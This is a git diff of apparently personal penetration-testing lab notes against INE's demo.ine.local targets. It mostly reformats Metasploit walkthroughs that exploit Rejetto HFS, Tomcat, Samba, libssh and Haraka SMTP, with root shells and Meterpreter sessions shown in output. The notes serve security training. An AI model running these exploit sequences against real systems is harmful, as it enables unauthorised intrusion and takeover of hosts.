@@ -6,22 +6,23 @@
 	nmap -sV -sC demo.ine.local
 		80/tcp    open  http               HttpFileServer httpd 2.3
 		|_http-server-header: HFS 2.3
-
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	ifconfig (10.10.38.6 )
+ 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	msfconsole -q
 		search hfs 
 		use exploit(windows/http/rejetto_hfs_exec
 		set RHOSTS demo.ine.local
 ## Windows: Java Web Server
 	=> Apache Tomcat is a Java web server
-
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sV -sC demo.ine.local
 		8009/tcp  open  ajp13              Apache Jserv (Protocol v1.3)
 		|_ajp-methods: Failed to get a valid response for the OPTION request
 		8080/tcp  open  http               Apache Tomcat 8.5.19
 
 	ifconfig (10.10.38.2)
- 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~`
+ 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	searchsploit Apache Tomcat 8.5.19
  	msfconsole -q
 		use exploit(multi/http/tomcat_jsp_upload_bypass)
@@ -39,8 +40,9 @@
 		set RHOSTS demo.ine.local
 	
 	[*] Command shell session 1 opened (192.108.87.2:38713 -> 192.108.87.3:6200) at 2025-01-15 20:35:59 +0530
-	whoami
-	root
+	 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		whoami
+		root
 ## Vulnerable File Sharing Service
 	nmap -sV -sC demo.ine.local
 		139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
@@ -57,16 +59,18 @@
 		check
 	[+] 192.208.68.3:445 - Samba version 4.1.17 found with writeable share 'exploitable'
 	[*] 192.208.68.3:445 - The target appears to be vulnerable.
-	exploit
-	[*] Command shell session 1 opened (192.208.68.2:42941 -> 192.208.68.3:445) at 2025-01-15 20:51:33 +0530
-	id
-	uid=0(root) gid=0(root) groups=0(root)
+	 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		exploit
+		[*] Command shell session 1 opened (192.208.68.2:42941 -> 192.208.68.3:445) at 2025-01-15 20:51:33 +0530
+  		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		id
+		uid=0(root) gid=0(root) groups=0(root)
 
 ## Vnlnerable SSH server
 	=> SSH (Secure Shell)
 	nmap -sV -sC demo.ine.local
 		22/tcp open  ssh     libssh 0.8.3 (protocol 2.0)
-
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	msfconsole -q
 		search libssh
 		use auxiliary/scanner/ssh/libssh_auth_bypass 
@@ -77,7 +81,7 @@
 	sessions -i 3
 ## Vulnerable SMTP Server
 	=> service postgresql start
-
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sV -sC demo.ine.local
 		25/tcp open  smtp    Haraka smtpd 2.8.8
 		|_smtp-commands: demo.ine.local Hello Unknown [192.109.105.2], Haraka is at your service., PIPELINING, 8BITMIME, SIZE 0
@@ -93,10 +97,10 @@
 		set rhost demo.ine.local
 		set LHOST 192.109.105.2
 		exploit
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	sessions -i 1
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	meterpreter > sysinfo 
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		sessions -i 1
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		meterpreter > sysinfo 
 
 # Post Exploitation Fundamentals
 ## Meterpreter Basics
@@ -174,22 +178,24 @@
 
 ## Upgrading Command Shells To Meterpreter Shells
 	nmap -sV demo.ine.local
+ 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	msfconsole -q
 		use exploit/linux/samba/is_known_pipename
 		set RHOSTS demo.ine.local
 		exploit 
 	[*] Found shell.
 	CTRL + Z
-	
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	ifconfig (192.21.142.2)
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	use post/multi/manage/shell_to_meterpreter
 		set SESSION 1
 		set LHOST 192.21.142.2
 		run
-	[*] Meterpreter session 2 opened (192.21.142.2:4433 -> 192.21.142.3:57508) 
-	sessions 2
-	meterpreter >
+		[*] Meterpreter session 2 opened (192.21.142.2:4433 -> 192.21.142.3:57508) 
+	 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		sessions 2
+		meterpreter >
 
 
 
